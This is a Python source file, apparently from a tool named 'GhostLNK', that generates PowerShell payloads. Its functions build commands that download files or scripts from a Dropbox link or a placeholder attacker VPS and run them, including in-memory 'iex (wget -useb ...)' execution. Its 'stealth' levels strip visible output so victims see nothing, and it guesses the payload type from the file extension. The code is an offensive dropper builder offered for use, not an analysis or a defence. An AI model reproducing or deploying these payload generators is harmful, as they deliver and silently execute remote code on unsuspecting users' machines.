class URLExamples:
    DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4obwg71nm7wu5plfvtr/doc.pdf?rlkey=rl63zpok5szx3ruly7pfmltqn&st=17b8n5wl&dl=1"
    DROPBOX_PS1_EXAMPLE = "https://www.dropbox.com/scl/fi/abc123/script.ps1?rlkey=xyz&dl=1"

    @staticmethod
    def get_all_examples():
        return {
            "Dropbox PDF": {"url": URLExamples.DROPBOX_EXAMPLE, "type": "document"},
            "Dropbox PowerShell": {"url": URLExamples.DROPBOX_PS1_EXAMPLE, "type": "script"},
            "Your VPS - File": {"url": "http://YOUR-VPS-IP:8000/file.pdf", "type": "document"},
            "Your VPS - Script": {"url": "http://YOUR-VPS-IP:8000/script.ps1", "type": "script"},
        }


class PowerShellConverter:
    @staticmethod
    def create_download_and_open_payload(url, pause=True, debug=False, stealth_level=0):
        if stealth_level == 2:
            ps = f'''$u="{url}";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";'''
            return ps.strip()
        elif stealth_level == 1:
            ps = f'''$url = "{url}";$temp = [IO.Path]::GetTempPath();$file = Join-Path $temp "doc.pdf";(New-Object Net.WebClient).DownloadFile($url, $file);Start-Process $file'''
            return ps.strip()
        elif debug:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Download & Open Mode (DEBUG)
Write-Host "[+] Downloading file..." -ForegroundColor Green;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("{url}", $tempFile);
Invoke-Item $tempFile;
Write-Host "[OK] Done!" -ForegroundColor Green;
{pause_cmd}'''
            return ps.strip()
        else:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Download & Open
Write-Host "[+] Downloading file..." -ForegroundColor Green;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("{url}", $tempFile);
Invoke-Item $tempFile;
Write-Host "[OK] Done!" -ForegroundColor Green;
{pause_cmd}'''
            return ps.strip()

    @staticmethod
    def create_memory_execute_payload(url, pause=True, debug=False, stealth_level=0):
        if stealth_level == 2:
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Memory Execute Mode (DEBUG)
Write-Host "[+] Executing script..." -ForegroundColor Green;
Invoke-Expression (wget -useb "{url}");
Write-Host "[OK] Done!" -ForegroundColor Green;
{pause_cmd}'''
            return ps.strip()
        else:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Memory Execute
Write-Host "[+] Executing script..." -ForegroundColor Green;
Invoke-Expression (wget -useb "{url}");
Write-Host "[OK] Done!" -ForegroundColor Green;
{pause_cmd}'''
            return ps.strip()

    @staticmethod
    def create_stealth_payload(url, pause=False, debug=False, stealth_level=0):
        if stealth_level == 2:
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}'''
            return ps.strip()
        else:
            pause_cmd = '\nWrite-Host "";\nWrite-Host "Press any key to exit this window..." -ForegroundColor White;\n$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");\n' if pause else ""
            ps = f'''# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}'''
            return ps.strip()

    @staticmethod
    def validate_dropbox_url(url):
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
            return True, "Valid Dropbox URL"
        return True, "Not a Dropbox URL"

    @staticmethod
    def guess_payload_type(url):
        url_lower = url.lower()
        if '.ps1' in url_lower:
            return "memory_execute"
        elif '.exe' in url_lower:
            return "download_open"
        else:
            return "download_open"
